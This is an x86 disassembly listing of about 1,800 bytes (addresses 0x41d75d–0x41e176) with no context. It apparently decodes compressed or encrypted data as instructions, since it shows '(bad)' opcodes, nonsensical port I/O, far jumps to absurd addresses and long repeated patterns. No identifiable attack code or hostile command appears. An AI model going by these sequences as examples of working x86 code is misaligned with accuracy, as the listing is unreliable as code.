  41d75d:	pop    ebp
  41d75e:	daa    
  41d75f:	push   ecx
  41d760:	fist   DWORD PTR [eax+0x36]
  41d763:	fldcw  WORD PTR [bp+di]
  41d766:	cmp    al,0x64
  41d768:	adc    dh,BYTE PTR ds:[ebx]
  41d76b:	ins    DWORD PTR es:[edi],dx
  41d76c:	popf   
  41d76d:	pop    ds
  41d76e:	ss jno 0x41d6f8
  41d771:	sbb    BYTE PTR [ebp+0x6d],dl
  41d774:	lea    ebx,[edi]
  41d776:	ss jno 0x41d710
  41d779:	and    DWORD PTR [edi],ebx
  41d77b:	inc    edi
  41d77c:	mov    ds:0x9b6e0144,al
  41d781:	or     BYTE PTR [eax+esi*2],ah
  41d784:	xchg   edi,eax
  41d785:	pop    ebx
  41d786:	(bad)  
	...
  41d7b0:	add    BYTE PTR [eax],al
  41d7b2:	push   ebx
  41d7b3:	mov    bh,0x8b
  41d7b5:	pop    ds
  41d7b6:	mov    eax,ds:0xcb31378c
  41d7bc:	add    BYTE PTR [ebp+0x6d],0xb9
  41d7c0:	lea    ebp,[eax]
  41d7c2:	ins    BYTE PTR es:[edi],dx
  41d7c3:	cdq    
  41d7c4:	jns    0x41d7ee
  41d7c6:	pop    ebp
  41d7c7:	pop    ebx
  41d7c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7c9:	sub    BYTE PTR [edx-0x58],cl
  41d7cc:	jp     0x41d7f6
  41d7ce:	dec    esp
  41d7cf:	cwde   
  41d7d0:	push   ebp
  41d7d1:	aaa    
  41d7d2:	push   ebp
  41d7d3:	pop    ebx
  41d7d4:	out    0x20,eax
  41d7d6:	sub    bh,BYTE PTR [eax-0x489c09e6]
  41d7dc:	cmp    esp,DWORD PTR [eax]
  41d7de:	ds scas al,BYTE PTR es:[edi]
  41d7e0:	cmp    ebp,DWORD PTR [ecx]
  41d7e2:	repz retf 0x2244
  41d7e6:	out    dx,eax
  41d7e7:	mov    BYTE PTR [esi+0x36],0xf1
  41d7eb:	mov    ecx,0xbc3e0444
  41d7f0:	or     edi,DWORD PTR [edx]
  41d7f2:	loope  0x41d7be
  41d7f4:	adc    ch,dh
  41d7f6:	das    
  41d7f7:	or     DWORD PTR [ebx],0x285ae220
  41d7fd:	and    dl,bl
  41d7ff:	ror    DWORD PTR [edx],0x23
  41d802:	jmp    0x5a3:0xe22228b7
  41d809:	sbb    ecx,edx
  41d80b:	ret    
  41d80c:	or     BYTE PTR [eax],ah
  41d80e:	loope  0x41d7e4
  41d810:	int3   
  41d811:	push   esp
  41d812:	fnstenv [esi+0x44e7]
	...
  41d840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d841:	mov    eax,0xc28a1cca
  41d846:	ret    0x9826
  41d849:	mov    al,ds:0xb89c1ecc
  41d84e:	mov    ecx,0xc4a634
  41d853:	mov    ecx,0xc472993d
  41d858:	pusha  
  41d859:	lods   al,BYTE PTR ds:[esi]
  41d85a:	lea    edi,[di]
  41d85d:	pushf  
  41d85e:	jb     0x41d7e4
  41d860:	and    DWORD PTR [esi-0x41af6392],ebx
  41d866:	jb     0x41d7f0
  41d868:	xor    DWORD PTR [esi-0x328516c1],edi
  41d86e:	arpl   WORD PTR [ebp-0x739c3279],ax
  41d874:	cmp    eax,0xd70729c
  41d879:	mov    DWORD PTR [ebp+0x4c],0x4471ae06
  41d880:	jo     0x41d826
  41d882:	arpl   WORD PTR [eax+0x3a],dx
  41d885:	pushf  
  41d886:	jb     0x41d8d8
  41d888:	jb     0x41d851
  41d88a:	inc    ebx
  41d88b:	inc    ecx
  41d88c:	push   0xffffffc0
  41d88e:	jb     0x41d8c5
  41d890:	pop    ebx
  41d891:	mov    esi,0xccfae977
  41d896:	ja     0x41d8d1
  41d898:	inc    esi
  41d899:	xchg   edi,eax
  41d89a:	arpl   WORD PTR [edx],bx
  41d89c:	inc    esi
  41d89d:	int    0x6d
  41d89f:	and    BYTE PTR [ebx],bh
  41d8a1:	mov    esi,0xe977
	...
  41d8ce:	cli    
  41d8cf:	int3   
  41d8d0:	ja     0x41d8eb
  41d8d2:	lods   eax,DWORD PTR es:[esi]
  41d8d4:	arpl   WORD PTR ds:0x471b219,dx
  41d8da:	add    eax,eax
  41d8dc:	outs   dx,BYTE PTR ds:[esi]
  41d8dd:	std    
  41d8de:	sbb    bl,dl
  41d8e0:	je     0x41d8cb
  41d8e2:	repz mov ebp,0xc70bcc76
  41d8e8:	push   esp
  41d8e9:	into   
  41d8ea:	xchg   edx,eax
  41d8eb:	mov    esp,0x9e3dcf6c
  41d8f0:	jo     0x41d8b6
  41d8f2:	pop    edi
  41d8f3:	stos   DWORD PTR es:[edi],eax
  41d8f4:	jb     0x41d8f6
  41d8f6:	or     BYTE PTR [eax+0x61],bh
  41d8f9:	jae    0x41d8cf
  41d8fb:	test   al,0x6b
  41d8fd:	imul   eax,DWORD PTR [edx],0x7b
  41d900:	add    BYTE PTR [ecx-0x36],cl
  41d903:	mov    WORD PTR [ecx+0x72],fs
  41d906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d907:	jnp    0x41d977
  41d909:	popa   
  41d90a:	sar    DWORD PTR [ecx+0x4c],cl
  41d90d:	outs   dx,DWORD PTR ds:[esi]
  41d90e:	rol    BYTE PTR [ebx+0x7ac86461],0x51
  41d915:	jae    0x41d8c9
  41d917:	xchg   BYTE PTR [eax],al
  41d919:	inc    edi
  41d91a:	ret    0x5488
  41d91d:	outs   dx,DWORD PTR ds:[esi]
  41d91e:	mov    esp,0x49496e79
  41d923:	sub    BYTE PTR [ebx+0x72],0x6a
  41d927:	jbe    0x41d99d
  41d929:	imul   ecx,DWORD PTR [eax],0xf8430071
  41d92f:	jo     0x41d9a7
  41d931:	add    BYTE PTR gs:[eax],al
	...
  41d95c:	add    eax,0xf3694f93
  41d961:	mov    dl,0x6b
  41d963:	push   ebx
  41d964:	push   ebx
  41d965:	lea    esp,[ebp+0x6e]
  41d968:	add    BYTE PTR [ebp+eiz*2+0x4c575664],ch
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	xor    BYTE PTR [eax+0x6e],dh
  41d973:	push   ebp
  41d974:	push   esp
  41d975:	xor    BYTE PTR [edx+0x41],0x67
  41d979:	nop
  41d97a:	imul   ebp,DWORD PTR [edi+0x3c],0xffffff92
  41d97e:	jo     0x41d9d0
  41d980:	outs   dx,DWORD PTR gs:[esi]
  41d982:	jbe    0x41d9ed
  41d984:	dec    ebx
  41d985:	and    BYTE PTR [ebx+0x65],0x31
  41d989:	jbe    0x41d9f7
  41d98b:	jne    0x41d9cf
  41d98d:	xchg   esi,eax
  41d98e:	add    BYTE PTR [ecx+0x73],al
  41d991:	jb     0x41da04
  41d993:	jae    0x41d9a8
  41d995:	test   al,0x6b
  41d997:	imul   edi,DWORD PTR [esi],0x1f
  41d99a:	sbb    edx,DWORD PTR [eax-0x54]
  41d99d:	sbb    esi,DWORD PTR [ebx]
  41d99f:	addr16 xchg edx,eax
  41d9a1:	pop    ds
  41d9a2:	arpl   WORD PTR es:[ebp-0x739efebe],cx
  41d9a9:	or     esi,DWORD PTR [ecx]
  41d9ab:	je     0x41d9fa
  41d9ad:	push   esp
  41d9ae:	(bad)  [ebx-0x6e]
  41d9b1:	out    0x0,al
  41d9b3:	inc    ecx
  41d9b4:	ins    BYTE PTR es:[edi],dx
  41d9b5:	sti    
  41d9b6:	xor    BYTE PTR [ebx+ecx*4-0x28],dh
  41d9ba:	xor    BYTE PTR [edx+0x59],dh
  41d9bd:	out    0x27,al
  41d9bf:	popa   
	...
  41d9e8:	add    BYTE PTR [eax],al
  41d9ea:	push   0xfffffffe
  41d9ec:	and    esi,DWORD PTR [edi+ebx*2+0x42]
  41d9f0:	inc    edx
  41d9f1:	arpl   WORD PTR [esi+ecx*8+0x3e],cx
  41d9f5:	jo     0x41da5a
  41d9f7:	rcl    BYTE PTR [edx+0x77],1
  41d9fa:	dec    ebp
  41d9fb:	scas   al,BYTE PTR es:[edi]
  41d9fc:	daa    
  41d9fd:	imul   ecx,DWORD PTR ds:0x1b721da6,0xffffff83
  41da04:	add    al,0x41
  41da06:	and    esi,DWORD PTR [eax+edi*1+0x1f8f1043]
  41da0d:	inc    ecx
  41da0e:	and    edx,DWORD PTR [eax+edi*1+0x219b1867]
  41da15:	pop    edi
  41da16:	adc    dl,BYTE PTR [edi-0x6aefb8cf]
  41da1c:	cmp    BYTE PTR [ebp-0x14],ch
  41da1f:	push   esi
  41da20:	add    al,0x41
  41da22:	(bad)  [ebx+0x38]
  41da25:	inc    ecx
  41da26:	ficom  DWORD PTR [eax+0x32]
  41da29:	arpl   WORD PTR ds:0xe3721e4e,cx
  41da2f:	inc    ecx
  41da30:	inc    edx
  41da31:	jb     0x41da0a
  41da33:	push   ecx
  41da34:	xor    eax,0x3852dd3f
  41da39:	addr16 int3 
  41da3b:	pop    edx
  41da3c:	int3   
  41da3d:	inc    edx
  41da3e:	popf   
  41da3f:	leave  
  41da40:	rcr    DWORD PTR [eax+ebx*4],cl
  41da43:	(bad)  
  41da44:	retf   0xb224
  41da47:	mov    eax,0xc59931b7
  41da4c:	enter  0x37,0x0
	...
  41da78:	popf   
  41da79:	mov    ds:0x5b3e2cc4,al
  41da7e:	les    esi,FWORD PTR [edx]
  41da80:	mov    eax,ds:0x921fc37d
  41da85:	pop    ebx
  41da86:	mov    ah,0x32
  41da88:	popa   
  41da89:	xchg   esi,eax
  41da8a:	test   BYTE PTR [edi],dh
  41da8c:	jg     0x41da4c
  41da8e:	test   BYTE PTR [ebx],dh
  41da90:	pop    ebx
  41da91:	mov    ebp,0xab6a1d84
  41da96:	mov    BYTE PTR [edi],dh
  41da98:	pushfw 
  41da9a:	out    0x3,eax
  41da9c:	dec    esi
  41da9d:	retf   0x1e7b
  41daa0:	dec    esp
  41daa1:	mov    eax,0xbf5ddd8a
  41daa6:	push   ebx
  41daa7:	add    al,0xe
  41daa9:	stos   BYTE PTR es:[edi],al
  41daaa:	push   ebx
  41daab:	sbb    eax,0x322ab82c
  41dab0:	sbb    eax,0xf92753bc
  41dab5:	mov    esp,0xbcf9383a
  41daba:	dec    edx
  41dabb:	daa    
  41dabc:	ds pop ebx
  41dabe:	out    0x3,eax
  41dac0:	ds pop ebx
  41dac2:	out    0x3,eax
  41dac4:	ds pop ebx
  41dac6:	out    0x3,eax
  41dac8:	ds pop ebx
  41daca:	out    0x3,eax
  41dacc:	ds pop ebx
  41dace:	out    0x3,eax
  41dad0:	ds pop ebx
  41dad2:	out    0x3,eax
  41dad4:	ds pop ebx
  41dad6:	out    0x3,eax
  41dad8:	ds pop ebx
  41dada:	out    0x3,eax
	...
  41db04:	add    BYTE PTR [eax],al
  41db06:	ds pop ebx
  41db08:	add    cl,ch
  41db0a:	cmp    eax,0x3de9005b
  41db0f:	pop    ebx
  41db10:	add    cl,ch
  41db12:	cmp    eax,0x3de9005b
  41db17:	pop    ebx
  41db18:	add    cl,ch
  41db1a:	cmp    eax,0x3de9005b
  41db1f:	pop    ebx
  41db20:	add    cl,ch
  41db22:	cmp    eax,0x3de9005b
  41db27:	pop    ebx
  41db28:	add    cl,ch
  41db2a:	cmp    eax,0x3de9005b
  41db2f:	pop    ebx
  41db30:	add    cl,ch
  41db32:	cmp    eax,0x3de9005b
  41db37:	pop    ebx
  41db38:	add    cl,ch
  41db3a:	cmp    eax,0x3de9005b
  41db3f:	pop    ebx
  41db40:	add    cl,ch
  41db42:	cmp    eax,0x3de9005b
  41db47:	pop    ebx
  41db48:	add    cl,ch
  41db4a:	cmp    eax,0x3de9005b
  41db4f:	pop    ebx
  41db50:	add    cl,ch
  41db52:	cmp    eax,0x3de9005b
  41db57:	pop    ebx
  41db58:	add    cl,ch
  41db5a:	cmp    eax,0x425a005b
  41db5f:	mov    edx,0x8b8f556c
  41db64:	cs inc ebp
  41db66:	pop    esi
  41db67:	mov    edi,0x1a00
	...
  41db94:	dec    edx
  41db95:	cwde   
  41db96:	arpl   WORD PTR ds:0xd6cbff8,si
  41db9c:	and    ecx,ecx
  41db9e:	push   eax
  41db9f:	or     BYTE PTR [esi],dh
  41dba1:	ret    
  41dba2:	aas    
  41dba3:	jmp    0xe94236e5
  41dba8:	cmp    eax,0x2600494d
  41dbad:	push   edi
  41dbae:	cmovl  esp,DWORD PTR [esi]
  41dbb1:	push   edi
  41dbb2:	pop    ds
  41dbb3:	dec    esp
  41dbb4:	push   ss
  41dbb5:	push   edi
  41dbb6:	xor    eax,0x4357164c
  41dbbb:	dec    esp
  41dbbc:	out    0x58,al
  41dbbe:	push   ebx
  41dbbf:	dec    esp
  41dbc0:	out    0x58,al
  41dbc2:	arpl   WORD PTR [esi+edx*8+0x58],cx
  41dbc6:	jl     0x41dc14
  41dbc8:	(bad)  
  41dbc9:	pop    eax
  41dbca:	(bad)  
  41dbcb:	dec    esp
  41dbcc:	out    0x58,al
  41dbce:	mov    ds:0xc058e64c,eax
  41dbd3:	dec    esp
  41dbd4:	(bad)  
  41dbd5:	pop    eax
  41dbd6:	in     al,0x4c
  41dbd8:	(bad)  
  41dbd9:	pop    eax
  41dbda:	std    
  41dbdb:	dec    esp
  41dbdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbdd:	pop    eax
  41dbde:	add    BYTE PTR [eax],al
  41dbe0:	out    0x58,eax
  41dbe2:	std    
  41dbe3:	call   edi
  41dbe5:	fadd   DWORD PTR [eax]
  41dbe7:	add    bh,dl
  41dbe9:	pop    eax
  41dbea:	dec    ecx
  41dbeb:	jns    0x41dbf4
  41dbed:	xchg   ebp,eax
  41dbee:	imul   esp,DWORD PTR [ebx+0x4a],0x6d
  41dbf2:	popa   
  41dbf3:	outs   dx,BYTE PTR ds:[esi]
  41dbf4:	dec    ebx
  41dbf5:	mov    eax,DWORD PTR [eax]
  41dbf7:	add    DWORD PTR [eax],eax
	...
  41dc21:	add    bh,dl
  41dc23:	pop    eax
  41dc24:	sbb    BYTE PTR [edx],0xa7
  41dc27:	pop    eax
  41dc28:	add    BYTE PTR [ecx+0x17],al
  41dc2b:	xchg   DWORD PTR [ecx+eiz*2+0xb],eax
  41dc2f:	jbe    0x41dc31
  41dc31:	add    DWORD PTR [edi-0x58e37fa8],edx
  41dc37:	pop    eax
  41dc38:	add    BYTE PTR [eax+eax*1+0x74],cl
  41dc3c:	pop    ebp
  41dc3d:	ins    BYTE PTR es:[edi],dx
  41dc3e:	aaa    
  41dc3f:	xchg   esi,eax
  41dc40:	jo     0x41dcb2
  41dc42:	pop    ebx
  41dc43:	jbe    0x41dcb9
  41dc45:	popa   
  41dc46:	addr16 push edi
  41dc48:	add    BYTE PTR [eax],al
  41dc4a:	out    0x36,eax
  41dc4c:	std    
  41dc4d:	(bad)  
  41dc4e:	ds inc edx
  41dc50:	inc    esi
  41dc51:	pop    edi
  41dc52:	fstp   QWORD PTR [ecx+0x1f]
  41dc55:	add    BYTE PTR [edi],bh
  41dc57:	inc    edx
  41dc58:	add    DWORD PTR [eax+0x1421f],eax
  41dc5e:	std    
  41dc5f:	push   esp
  41dc60:	sbb    DWORD PTR [ecx-0x29],ebp
  41dc63:	push   esi
  41dc64:	xor    eax,0x1423f00
  41dc69:	sbb    BYTE PTR [edx+eax*2+0x1],0x0
  41dc6e:	jbe    0x41dc8b
  41dc70:	ss je  0x41dc04
  41dc73:	xor    BYTE PTR [eax+eax*1],ch
  41dc76:	cmp    al,0x42
  41dc78:	add    DWORD PTR [eax+0x1423b],eax
  41dc7e:	jnp    0x41dc8b
  41dc80:	loope  0x41dcc5
  41dc82:	xchg   ecx,eax
  41dc83:	and    DWORD PTR [eax],esi
  41dc85:	imul   eax,DWORD PTR [eax],0x0
	...
  41dcb0:	arpl   sp,sp
  41dcb2:	sub    al,0x71
  41dcb4:	ds inc eax
  41dcb6:	add    DWORD PTR [eax],eax
  41dcb8:	mov    esi,0x3e000120
  41dcbd:	add    DWORD PTR [edx],ebx
  41dcbf:	imul   ebp,DWORD PTR [ebx-0x1b],0x16
  41dcc3:	and    BYTE PTR [edi-0x2e],bh
  41dcc6:	xor    DWORD PTR [edi+ebx*2-0x32],eax
  41dcca:	and    al,0x0
  41dccc:	aas    
  41dccd:	inc    edx
  41dcce:	add    DWORD PTR [eax+0x14261],eax
  41dcd4:	add    edi,DWORD PTR [ebx-0x5ee8b01c]
  41dcda:	xor    BYTE PTR [ebx+0x2c],dh
  41dcdd:	xchg   edi,eax
  41dcde:	xor    eax,0x1423c00
  41dce3:	and    BYTE PTR [eax+0x42],0x1
  41dce7:	add    ch,bh
  41dce9:	xchg   esp,eax
  41dcea:	pop    ss
  41dceb:	imul   edx,DWORD PTR [ecx],0xffffff8c
  41dcee:	in     al,0x43
  41dcf0:	jmp    0xe572e74f
  41dcf5:	mov    ch,0xd
  41dcf7:	xor    bh,ch
  41dcf9:	pop    edx
  41dcfa:	jmp    0xbe1d1b02
  41dcff:	add    edi,DWORD PTR [esi]
  41dd01:	pop    ebx
  41dd02:	sub    bl,BYTE PTR [ebx]
  41dd04:	in     eax,0xbd
  41dd06:	push   cs
  41dd07:	sbb    bl,BYTE PTR [esi]
  41dd09:	call   0x3700:0xbcd9190b
  41dd10:	mov    dl,0xcd
  41dd12:	enter  0x2f,0x0
	...
  41dd3e:	cdq    
  41dd3f:	rol    esp,1
  41dd41:	jecxz  0x41dcd0
  41dd43:	mov    edx,0x5baf17c6
  41dd48:	call   0xf71d1b50
  41dd4d:	add    edi,DWORD PTR [esi]
  41dd4f:	pop    ebx
  41dd50:	test   al,0x1f
  41dd52:	xchg   ebp,eax
  41dd53:	mov    ah,0xc5
  41dd55:	sbb    al,0x8f
  41dd57:	iret   
  41dd58:	mov    ecx,0x9db47224
  41dd5d:	and    BYTE PTR [esi],bl
  41dd5f:	scas   eax,DWORD PTR es:[edi]
  41dd60:	mov    ds,WORD PTR [edx]
  41dd62:	pop    edx
  41dd63:	into   
  41dd64:	out    0x4,eax
  41dd66:	ds pop ebx
  41dd68:	add    BYTE PTR ds:0xe75b,bh
  41dd6d:	push   ebx
  41dd6e:	pop    ebp
  41dd6f:	int    0x7a
  41dd71:	sbb    bl,BYTE PTR [eax-0x44]
  41dd74:	add    DWORD PTR [ebx],0x6f
  41dd77:	mov    edx,0xbc332f85
  41dd7c:	pop    ecx
  41dd7d:	pop    ds
  41dd7e:	adc    bl,BYTE PTR [eax-0x45d3dab0]
  41dd84:	pop    edx
  41dd85:	sbb    DWORD PTR [eax],ebx
  41dd87:	iret   
  41dd88:	sub    edx,DWORD PTR [ecx+0x21]
  41dd8b:	mov    ecx,0xce0b194b
  41dd90:	sbb    eax,DWORD PTR [ebp+0xd]
  41dd93:	int    0x0
  41dd95:	cmp    esp,DWORD PTR [ecx]
  41dd97:	mov    ecx,0xcd591774
  41dd9c:	jno    0x41ddae
  41dd9e:	push   edi
  41dd9f:	mov    ecx,0x245c
	...
  41ddcc:	sbb    cl,bl
  41ddce:	ins    BYTE PTR es:[edi],dx
  41ddcf:	push   es
  41ddd0:	sub    BYTE PTR [esi-0x4d0cd28e],bh
  41ddd6:	arpl   WORD PTR ds:0xe467b36,dx
  41dddc:	es mov edi,0x5b0afb63
  41dde2:	arpl   cx,si
  41dde4:	ins    DWORD PTR es:[edi],dx
  41dde5:	mov    bh,0x6d
  41dde7:	fist   DWORD PTR [eax-0x33]
  41ddea:	les    edx,FWORD PTR cs:[ebp-0x42]
  41ddee:	add    BYTE PTR [edx+0x142b7908],bh
  41ddf4:	icebp  
  41ddf5:	js     0x41de2f
  41ddf7:	jmp    0xe9423939
  41ddfc:	jb     0x41ddbc
  41ddfe:	inc    edi
  41ddff:	les    ecx,FWORD PTR [ebp-0x42]
  41de02:	jb     0x41ddbe
  41de04:	push   esi
  41de05:	mov    ecx,0xab509d5f
  41de0a:	jb     0x41dd9c
  41de0c:	das    
  41de0d:	ret    0x8c6c
  41de10:	push   ds
  41de11:	mov    esi,0xaf38ba00
  41de16:	popa   
  41de17:	mov    ebp,DWORD PTR [ebp-0x33]
  41de1a:	addr16 ja 0x41de41
  41de1d:	mov    bh,0x63
  41de1f:	mov    fs,WORD PTR [eax]
  41de21:	pop    ebx
  41de22:	push   ecx
  41de23:	test   BYTE PTR [edx],al
  41de25:	mov    bl,0x5f
  41de27:	push   edi
  41de28:	pop    edi
  41de29:	mov    esi,0xc26e4e4e
  41de2e:	push   ax
	...
  41de58:	add    BYTE PTR [eax],al
  41de5a:	or     cl,ch
  41de5c:	addr16 push edi
  41de5e:	xor    eax,0x63b7
  41de63:	push   0x0
  41de65:	push   ebx
  41de66:	add    ah,BYTE PTR [eax-0x75099a8e]
  41de6c:	popa   
  41de6d:	push   esp
  41de6e:	cmp    BYTE PTR [eax+0x61],ch
  41de71:	outs   dx,BYTE PTR ds:[esi]
  41de72:	aaa    
  41de73:	xchg   ecx,eax
  41de74:	gs jbe 0x41dec5
  41de77:	arpl   WORD PTR [ecx+0x67],sp
  41de7a:	xor    bl,BYTE PTR [edi+0x4f]
  41de7d:	gs and eax,0x526b5f7e
  41de83:	lea    edx,[eax+0x72]
  41de86:	lea    esp,cs:[ebp+0x6c]
  41de8a:	xor    bh,BYTE PTR [ecx+eiz*2+0x0]
  41de8e:	push   esp
  41de8f:	push   0x79146552
  41de94:	imul   esi,DWORD PTR [edx+0x2],0xffffffad
  41de98:	jb     0x41df03
  41de9a:	add    DWORD PTR [esi+0x6c],esp
  41de9d:	add    BYTE PTR gs:[edx+0x0],ch
  41dea1:	push   ebx
  41dea2:	add    al,BYTE PTR [esi+0x69c5636e]
  41dea8:	pop    ebp
  41dea9:	jae    0x41de9d
  41deab:	lods   eax,DWORD PTR ds:[esi]
  41deac:	jno    0x41df1d
  41deae:	mov    bl,0x7d
  41deb0:	push   eax
  41deb1:	jb     0x41de81
  41deb3:	mov    ah,BYTE PTR [ebp+0x6c]
  41deb6:	ret    0x617b
  41deb9:	add    BYTE PTR [ecx+ebp*2+0x733d],ah
	...
  41dee8:	mov    ah,0x65
  41deea:	arpl   WORD PTR [esi-0x49],bp
  41deed:	mov    fs,WORD PTR [ebp+0x6d]
  41def0:	mov    dh,0x8e
  41def2:	jne    0x41df48
  41def4:	mov    eax,0xd76e6167
  41def9:	mov    fs,WORD PTR [ebp+0x76]
  41defc:	push   cs
  41defd:	arpl   WORD PTR [ecx+0x67],sp
  41df00:	add    bl,BYTE PTR [edi+0x0]
  41df03:	push   eax
  41df04:	adc    DWORD PTR ds:[ecx+0x54],0x20315f5e
  41df0c:	push   es
  41df0d:	push   ax
  41df0f:	push   eax
  41df10:	pop    ecx
  41df11:	inc    ebx
  41df12:	shr    DWORD PTR [edi],cl
  41df14:	xor    edi,DWORD PTR [ecx+edi*1]
  41df17:	ins    DWORD PTR es:[edi],dx
  41df18:	in     eax,dx
  41df19:	(bad)  
  41df1a:	jmp    0xff09:0xf7651b1f
  41df21:	push   esp
  41df22:	and    DWORD PTR [ebx-0x12],esp
  41df25:	gs jmp 0x440a:0xd709241f
  41df2d:	jae    0x41df50
  41df2f:	popa   
  41df30:	jecxz  0x41df73
  41df32:	sub    eax,0x215ffb2b
  41df37:	ins    DWORD PTR es:[edi],dx
  41df38:	mov    ds:0x7465165b,al
  41df3d:	push   edx
  41df3e:	sbb    esp,DWORD PTR [ebx+eiz*4+0x18]
  41df42:	sub    eax,0xd52baa67
  41df47:	pop    ds
  41df48:	fs ins DWORD PTR es:[edi],dx
  41df4a:	xor    edi,DWORD PTR [ebx]
	...
  41df74:	add    BYTE PTR [eax],al
  41df76:	dec    esi
  41df77:	dec    edi
  41df78:	test   DWORD PTR [eax-0x67],0x90632d18
  41df7f:	push   es
  41df80:	fmul   DWORD PTR [ebx+0x63]
  41df83:	or     BYTE PTR [esi],bl
  41df85:	je     0x41dfed
  41df87:	cmp    al,0xe1
  41df89:	and    bl,BYTE PTR [edx-0x11]
  41df8c:	test   DWORD PTR [ecx],0x6e12e17d
  41df92:	arpl   bp,dx
  41df94:	sub    al,0x67
  41df96:	popa   
  41df97:	lock out 0x1f,al
  41df9a:	pop    ebp
  41df9b:	(bad)  
  41df9c:	adc    eax,0xf73f5b71
  41dfa1:	inc    eax
  41dfa2:	sub    eax,ecx
  41dfa4:	sub    eax,0x5b5b2063
  41dfa9:	(bad)  ds:0x642157c2
  41dfaf:	jnp    0x41dff9
  41dfb1:	xor    al,0xe
  41dfb3:	mov    bh,0x40
  41dfb5:	and    esi,ecx
  41dfb7:	into   
  41dfb8:	push   eax
  41dfb9:	pop    ss
  41dfba:	sbb    BYTE PTR [eax+0x4e],bh
  41dfbd:	and    ecx,DWORD PTR [edx]
  41dfbf:	mov    esi,0xceeed93b
  41dfc4:	cmp    DWORD PTR [ecx],esp
  41dfc6:	adc    DWORD PTR [esi-0x4801060c],esi
  41dfcc:	or     eax,0x1bb8dd30
  41dfd1:	frndint 
  41dfd3:	mov    eax,0xb1da170a
  41dfd8:	adc    eax,0x1f
	...
  41e001:	add    BYTE PTR [eax],al
  41e003:	add    BYTE PTR [ebx+edi*2],al
  41e006:	or     DWORD PTR ds:0x2cf9b9d0,ebx
  41e00c:	inc    ebp
  41e00d:	push   ecx
  41e00e:	adc    al,0x33
  41e010:	popf   
  41e011:	leave  
  41e012:	adc    al,0x45
  41e014:	mov    ds:0x642fcdc0,eax
  41e019:	jnp    0x41dfbf
  41e01b:	push   ss
  41e01c:	xchg   esp,eax
  41e01d:	mov    ah,0xbb
  41e01f:	pop    ss
  41e020:	jno    0x41e098
  41e022:	sti    
  41e023:	aad    0x59
  41e025:	jnp    0x41e036
  41e027:	and    edx,DWORD PTR [ebx+0x7224b7b8]
  41e02d:	mov    ah,0xc9
  41e02f:	pop    ss
  41e030:	pop    ebp
  41e031:	add    bh,0x38
  41e034:	(bad)  
  41e035:	xchg   esp,eax
  41e036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e037:	jecxz  0x41e065
  41e039:	jne    0x41e012
  41e03b:	jmp    0xb65a:0x1580ae39
  41e042:	jle    0x41e076
  41e044:	push   ds
  41e045:	test   BYTE PTR [edi+0x5134dc],bh
  41e04b:	in     al,0xb7
  41e04d:	inc    esi
  41e04e:	inc    edx
  41e04f:	jle    0x41e09c
  41e051:	iret   
  41e052:	arpl   WORD PTR [edi+0x6e],dx
  41e055:	jb     0x41e0a3
  41e057:	inc    esp
  41e058:	dec    eax
  41e059:	shl    BYTE PTR [ecx+eax*2-0x5c],0x46
  41e05e:	dec    ecx
  41e05f:	ds pop edi
  41e061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e062:	je     0x41e0b4
  41e064:	xor    esi,DWORD PTR [ebp+0xe93a]
	...
  41e092:	inc    edx
  41e093:	call   0x2120:0xcb990954
  41e09a:	push   cs
  41e09b:	scas   eax,DWORD PTR es:[edi]
  41e09c:	push   eax
  41e09d:	(bad)  
  41e09e:	ins    BYTE PTR es:[edi],dx
  41e09f:	js     0x41e0d1
  41e0a1:	in     al,dx
  41e0a2:	addr16 sahf 
  41e0a4:	ins    DWORD PTR es:[edi],dx
  41e0a5:	sbb    cl,BYTE PTR [esi]
  41e0a7:	and    DWORD PTR [eax],0xa520ec4
  41e0ad:	sub    BYTE PTR [edi],bl
  41e0af:	mov    esp,0x8111f963
  41e0b4:	and    bl,al
  41e0b6:	adc    dh,BYTE PTR [ebx+ecx*1-0x1d]
  41e0ba:	jl     0x41e078
  41e0bc:	popa   
  41e0bd:	int3   
  41e0be:	ins    DWORD PTR es:[edi],dx
  41e0bf:	iret   
  41e0c0:	sub    esp,DWORD PTR [ebx+ecx*2+0x34cd6dbc]
  41e0c7:	mov    ch,0x65
  41e0c9:	adc    ebx,DWORD PTR [edx]
  41e0cb:	mov    ebp,0xcf33cc64
  41e0d0:	addr16 mov ch,0x54
  41e0d3:	ja     0x41e0f5
  41e0d5:	add    esp,edi
  41e0d7:	mov    ah,0x3b
  41e0d9:	stc    
  41e0da:	call   0x53d82232
  41e0df:	mov    ch,0x63
  41e0e1:	mov    dl,BYTE PTR [ecx]
  41e0e3:	mov    esi,0x65e7876d
  41e0e8:	popa   
  41e0e9:	jge    0x41e115
  41e0eb:	int3   
  41e0ec:	arpl   WORD PTR [eax],ax
  41e0ee:	rol    BYTE PTR [ebx+0x52],cl
  41e0f1:	jae    0x41e0ad
  41e0f3:	mov    ebp,DWORD PTR [ecx]
  41e0f5:	inc    ecx
	...
  41e11e:	add    BYTE PTR [eax],al
  41e120:	enter  0x6e64,0x74
  41e124:	in     eax,dx
  41e125:	cmp    DWORD PTR [edx+0x6f],ecx
  41e128:	sbb    eax,0xf66c6c62
  41e12d:	das    
  41e12e:	xor    DWORD PTR [esi],ebp
  41e130:	aaa    
  41e131:	aas    
  41e132:	and    eax,0x706e5063
  41e137:	popa   
  41e138:	dec    ebx
  41e139:	bound  esp,QWORD PTR [edx+0x6c]
  41e13c:	cli    
  41e13d:	xor    ebx,DWORD PTR ds:0x4182544d
  41e143:	and    BYTE PTR [edx+0x2f],ch
  41e146:	sub    eax,0x6596773b
  41e14b:	outs   dx,BYTE PTR ds:[esi]
  41e14c:	cmp    esi,DWORD PTR [eax+0x73]
  41e14f:	jae    0x41e0d8
  41e151:	xor    BYTE PTR ds:0xa437229,dh
  41e157:	or     dl,BYTE PTR [edi+0x2f]
  41e15a:	std    
  41e15b:	sub    eax,0x2a5c5971
  41e160:	add    DWORD PTR [ebx],esp
  41e162:	std    
  41e163:	sub    ecx,esi
  41e165:	and    bh,ch
  41e167:	inc    edi
  41e168:	call   0x1c4225ee
  41e16d:	es sub eax,0x222dcf38
  41e173:	xor    BYTE PTR [ebx],ch
  41e175:	xchg   edi,eax
  41e176:	sub    DWORD PTR ds:0x2d553507,esp
